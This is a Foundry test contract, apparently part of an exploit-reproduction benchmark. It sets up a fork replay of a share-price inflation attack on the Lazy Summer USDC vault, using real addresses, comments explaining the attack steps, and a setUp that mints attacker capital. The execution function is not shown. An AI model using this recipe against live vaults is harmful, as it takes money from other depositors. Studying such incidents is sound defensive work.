// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// Lazy Summer Protocol exploit (Summer.fi), 6 Jul 2026, block 25471348.
// tx: 0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12  (~$6.04M).
//
// The LazyVault_LowerRisk_USDC FleetCommander (ERC4626) prices shares off totalAssets(),
// the sum of every active Ark's totalAssets(). One Ark, SiloManagedVaultArk (0x61d70630),
// reports totalAssets() = siloVault.convertToAssets(siloVault.balanceOf(ark)). That Silo
// "Varlamore USDC Growth" vault (0x8399c8fc) was impaired by the Nov-2025 Stream Finance
// collapse but its on-chain share price was never marked down — so it reports a stale, high
// USDC-per-share. The ark was offboarded (deposit cap 0) yet left in the vault's ACTIVE NAV set.
//
// Attack: deposit USDC to mint shares at the honest price (~1.0665), then transfer (DONATE)
// pre-accumulated stale Silo shares directly into the ark -> ark.totalAssets() jumps by
// convertToAssets(donated) -> vault NAV/share price rises ~9.5% (to ~1.1684) -> redeem the
// freshly-minted shares at the inflated price, paid out of other depositors' liquid capital.

import {DSTest} from "ds-test/test.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";
import {FlashSynHarness} from "mylib/Harness.sol";


interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
}

// FleetCommander (ERC4626 USDC vault). Shares are 6-decimal.
interface IFleet {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function balanceOf(address account) external view returns (uint256);
}

// Silo "Varlamore USDC Growth" vault (ERC4626, 6-decimal shares). We only transfer its shares.
interface ISilo {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Lazy_Summer is DSTest, stdCheats, FlashSynHarness {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));

    IUSDC  internal constant USDC  = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IFleet internal constant FLEET = IFleet(address(0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17)); // LazyVault_LowerRisk_USDC
    ISilo  internal constant SILO  = ISilo(address(0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F));  // Silo Varlamore USDC Growth

    // The offboarded-but-active Silo ark whose totalAssets() the donation inflates.
    address internal constant ARK = 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2; // SiloManagedVaultArk

    // Capital the attacker enters with (matches manifest [initial_balances]).
    uint256 constant USDC_CAPITAL = 70000000e6;   // 70,000,000 USDC (flash-loan capital for the deposit)
    uint256 constant SILO_CAPITAL = 30000000000e6; // 3e16 raw stale Silo shares, pre-accumulated (impaired, ~free)

    function setUp() public {
        vm.label(attacker, "Attacker");

        // USDC via the real masterMinter.
        address MasterMinter = USDC.masterMinter();
        vm.prank(MasterMinter);
        USDC.configureMinter(attacker, type(uint256).max);
        vm.startPrank(attacker);
        USDC.mint(attacker, USDC_CAPITAL);
        vm.stopPrank();
        require(USDC.balanceOf(attacker) == USDC_CAPITAL, "USDC funding failed");

        // Pre-accumulated impaired Silo shares (StdStorage finds the balance slot).
        tip(address(SILO), attacker, SILO_CAPITAL);
        require(SILO.balanceOf(attacker) == SILO_CAPITAL, "SILO funding failed");

        vm.startPrank(attacker);
        USDC.approve(address(FLEET), type(uint256).max);
        // Redeem burns the attacker's own shares; SILO.transfer needs no approval. Leave prank open.
    }

    // Profit readout derived from the manifest (profit_tokens = USDC).
}
